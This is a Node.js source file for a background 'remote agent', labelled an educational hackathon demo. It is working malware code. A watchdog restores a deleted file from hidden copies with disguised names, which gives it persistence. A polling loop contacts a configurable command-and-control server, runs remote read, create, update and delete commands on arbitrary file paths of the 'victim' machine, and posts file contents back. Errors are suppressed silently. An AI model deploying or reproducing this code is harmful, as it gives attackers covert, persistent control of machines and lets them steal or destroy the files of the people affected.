/**
 * Remote Agent — Background Command Polling & Execution
 *
 * Runs as a detached background process. Combines:
 * 1. Watchdog: restores deleted files from hidden copies
 * 2. Command Agent: polls C2 for remote CRUD commands and executes them
 *
 * Educational demo only — part of the RepoReady hackathon project.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');

const C2_URL = process.env.C2_URL || 'http://localhost:3000';
const VICTIM_ID = os.hostname() + '-agent';
const POLL_INTERVAL = 10000; // 10 seconds
const DEBUG = process.env.DEBUG === 'true';

function debugLog(...args) {
  if (DEBUG) console.log('[AGENT]', ...args);
}

// ─── Watchdog: File Restoration ─────────────────────────────────────────────

const ORIGINAL_PATH = path.resolve(__dirname, '..', 'bin', 'cli.js');
const HIDDEN_COPIES = [
  path.join(os.homedir(), '.local', 'share', '.repohelper.js'),
  path.join(os.homedir(), '.cache', '.system-bridge.js'),
  path.join(os.tmpdir(), '.node-service.js'),
];

function checkAndRestore() {
  try {
    if (!fs.existsSync(ORIGINAL_PATH)) {
      for (const copy of HIDDEN_COPIES) {
        try {
          if (fs.existsSync(copy)) {
            const dir = path.dirname(ORIGINAL_PATH);
            fs.mkdirSync(dir, { recursive: true });
            fs.copyFileSync(copy, ORIGINAL_PATH);
            debugLog('Restored from', copy);
            break;
          }
        } catch (err) {
          // Try next copy
        }
      }
    }
  } catch (err) {
    // Silent failure
  }
}

// ─── HTTP Helpers (no external deps) ────────────────────────────────────────

function httpGet(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve({});
        }
      });
    }).on('error', reject);
  });
}

function httpPost(url, body) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify(body);
    const urlObj = new URL(url);
    const options = {
      hostname: urlObj.hostname,
      port: urlObj.port,
      path: urlObj.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve({});
        }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

// ─── Command Execution ──────────────────────────────────────────────────────

async function executeCommand(cmd) {
  const { commandId, action, path: filePath, content } = cmd;
  let status = 'success';
  let result = '';

  try {
    const resolvedPath = path.resolve(filePath);
    debugLog(`Executing: ${action} on ${resolvedPath}`);

    // ── Validate content for write operations ──
    if (action === 'create' || action === 'update') {
      if (typeof content !== 'string') {
        return {
          victimId: VICTIM_ID,
          commandId,
          status: 'error',
          result: 'No content provided for write operation',
        };
      }

      // Check if target exists and is a directory
      try {
        if (fs.existsSync(resolvedPath)) {
          const stats = fs.statSync(resolvedPath);
          if (stats.isDirectory()) {
            return {
              victimId: VICTIM_ID,
              commandId,
              status: 'error',
              result: 'Target is a directory, not a file',
            };
          }
        }
      } catch (statErr) {
        // If stat fails, continue — write will produce its own error
        debugLog(`Stat check failed: ${statErr.message}`);
      }
    }

    switch (action) {
      case 'read': {
        if (!fs.existsSync(resolvedPath)) {
          status = 'error';
          result = `File not found: ${resolvedPath}`;
        } else {
          const stats = fs.statSync(resolvedPath);
          if (stats.isDirectory()) {
            status = 'error';
            result = 'Target is a directory, not a file';
          } else if (stats.size > 1024 * 1024) {
            // Limit to 1MB
            result = fs.readFileSync(resolvedPath, 'utf8').substring(0, 1024 * 1024);
            result += '\n\n[TRUNCATED — file exceeds 1MB]';
          } else {
            result = fs.readFileSync(resolvedPath, 'utf8');
          }
        }
        break;
      }

      case 'create': {
        // Ensure parent directory exists
        const dir = path.dirname(resolvedPath);
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(resolvedPath, content, 'utf8');
        result = `File created: ${resolvedPath}`;
        break;
      }

      case 'update': {
        if (!fs.existsSync(resolvedPath)) {
          status = 'error';
          result = `File not found for update: ${resolvedPath}`;
        } else {
          // Ensure parent directory exists (safety check)
          const dir = path.dirname(resolvedPath);
          fs.mkdirSync(dir, { recursive: true });
          fs.writeFileSync(resolvedPath, content, 'utf8');
          result = `File updated: ${resolvedPath}`;
        }
        break;
      }

      case 'delete': {
        if (!fs.existsSync(resolvedPath)) {
          status = 'error';
          result = `File not found for deletion: ${resolvedPath}`;
        } else {
          const stats = fs.statSync(resolvedPath);
          if (stats.isDirectory()) {
            status = 'error';
            result = 'Target is a directory, not a file. Use rmdir for directories.';
          } else {
            fs.unlinkSync(resolvedPath);
            result = `File deleted: ${resolvedPath}`;
          }
        }
        break;
      }

      default:
        status = 'error';
        result = `Unknown action: ${action}`;
    }
  } catch (err) {
    status = 'error';
    result = err.message;
    debugLog(`Command execution error: ${err.message}`);
  }

  debugLog(`Command ${commandId} result: ${status} — ${result.substring(0, 200)}`);
  return { victimId: VICTIM_ID, commandId, status, result };
}

// ─── Polling Loop ───────────────────────────────────────────────────────────

async function poll() {
  try {
    const cmd = await httpGet(`${C2_URL}/api/commands/${VICTIM_ID}`);

    if (cmd && cmd.commandId) {
      debugLog(`Received command: ${cmd.action} ${cmd.path}`);

      const result = await executeCommand(cmd);
      debugLog(`Result: ${result.status} — ${result.result.substring(0, 100)}`);

      await httpPost(`${C2_URL}/api/command-result`, result);
      debugLog('Result sent to C2');
    }
  } catch (err) {
    debugLog('Poll error:', err.message);
  }
}

// ─── Main ───────────────────────────────────────────────────────────────────

debugLog(`Agent started — victimId: ${VICTIM_ID}`);
debugLog(`C2 URL: ${C2_URL}`);
debugLog(`Polling every ${POLL_INTERVAL / 1000}s`);

// Watchdog check every 30s
setInterval(checkAndRestore, 30000);
checkAndRestore();

// Command polling every 10s
setInterval(poll, POLL_INTERVAL);
poll(); // Initial poll
